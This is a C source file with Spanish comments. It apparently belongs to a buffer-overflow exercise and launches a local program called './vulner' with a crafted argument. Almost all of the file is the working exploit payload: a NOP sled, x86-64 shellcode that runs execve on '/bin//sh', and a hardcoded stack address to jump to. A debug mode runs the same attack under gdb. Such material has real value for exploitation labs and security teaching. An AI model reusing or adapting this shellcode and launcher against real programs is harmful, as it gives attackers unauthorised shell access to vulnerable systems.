#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *programVul = "./vulner";  // Programa a ejecutar
    int debugueando = 0;// a 1 para ejecutar con gdb
    char *debugguer= "gdb";  // El debuguer que quieras usar
        unsigned char shellcode[] =
        //PRIMERO UN POCO DE RELLENO:

    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90"
        //Shelcode:
        "\x48\x31\xd2"  //xor  rdx,
        "\x48\x31\xc0"  //xor rax rax
        "\x52"                  // push   rdx
        "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"//movrbx,/bin//sh
        "\x53"                  // push   rbx
        "\x48\x89\xe7"  // mov    rdi, rsp
        "\x52"                  // push   rdx
        "\x57"          // push   rdi
        "\x48\x89\xe6"  // mov    rsi, rsp
        "\xb0\x3b"              // mov    al, 59 (execve syscall FreeBSD)
        "\x0f\x05"              // syscall
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90"
        //DESPUES EL RELLENO
        //PARA TERMINAR LA DIRECCION A LA QUE SALTAR:
        //ooo
    "\x40\xd9\xff\xff\xff\x7f";// direccion de memoria a la que saltar


    char *args1[] = { programVul, shellcode, NULL };  // Argumentos a pasar sin debuguear
    char *args2[] = { debugguer,"--args",programVul, shellcode, NULL };  // Argumentos a pasar debugueando
    printf("Ejecutando %s con argumentos ...\n", programVul);
        if(debugueando){
    execvp(debugguer, args2);  // Ejecuta el programa con argumentos
        }else{

    execvp(programVul, args1);  // Ejecuta el programa con argumentos

        }



    // Si execvp falla, mostramos un error
    return 1;
}
